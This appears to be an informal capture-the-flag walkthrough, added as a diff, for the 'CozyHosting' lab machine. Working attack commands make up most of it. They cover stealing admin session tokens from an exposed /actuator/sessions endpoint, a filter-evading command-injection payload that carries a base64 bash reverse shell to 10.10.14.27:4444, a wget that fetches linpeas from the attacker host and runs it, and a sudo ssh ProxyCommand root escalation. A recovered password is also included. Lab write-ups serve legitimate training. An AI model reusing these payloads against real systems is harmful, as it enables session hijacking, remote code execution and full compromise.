@@ -1,0 +1,67 @@
+gobuster dir -u cozyhosting.htb -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt,html,zip
+
+TAKING TOO LONG lol :3
+
+dirsearch -u http://cozyhosting.htb/ -o dir.txt
+
+FOUND
+
+/actuator
+/login
+
+IN /actuator/sessions
+
+{"88635F8C8FBAA17C3A8F48EEA98B6418":"kanderson","638EA22CAED50101297A6A6F29CFB316":"UNAUTHORIZED","5C9E8E783F6493613796AC05DF8F72F7":"UNAUTHORIZED"}
+
+john --format=NT hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+markinho..*7¡Vamos! : kanderson
+
+FAILED lol '(
+
+Feel something wrong and open burp to test with cookies
+
+stucking with that fu*cking cookieeeeeeeeeee
+
+And I use cookie from /actuator/sessions with username admin '(
+
+In admin panel I found a place create a server with host and username
+
+In burp, username is RCE end point.
+
+REVERSHELL
+
+There can't be space in username lol
+
+echo "bash -i >& /dev/tcp/10.10.14.27/4444 0>&1" | base64 -w 0
+
+YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yNy80NDQ0IDA+JjEK  
+
+;echo${IFS%??}"<your payload here>"${IFS%??}|${IFS%??}base64${IFS%??}-d${IFS%??}|${IFS%??}bash;
+
+URL encode to this:
+;echo${IFS%??}"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yNy80NDQ0IDA+JjEK"${IFS%??}|${IFS%??}base64${IFS%??}-d${IFS%??}|${IFS%??}bash;
+and send in repeater ')  <I read some docs>
+
+GOT REVERSE SHELL (username= josh)
+
+Life is too short. Just use Linpeas. ')
+
+python -m http.server 8080
+
+in cozymachine under /tmp: wget 10.10.14.27:8080/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh
+
+user_password = manchesterunited
+
+lol site kar ta mar ha
+
+ROOTING
+
+sudo -l
+(root) /usr/bin/ssh *
+
+ssh payload
+sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
+
+
+
+
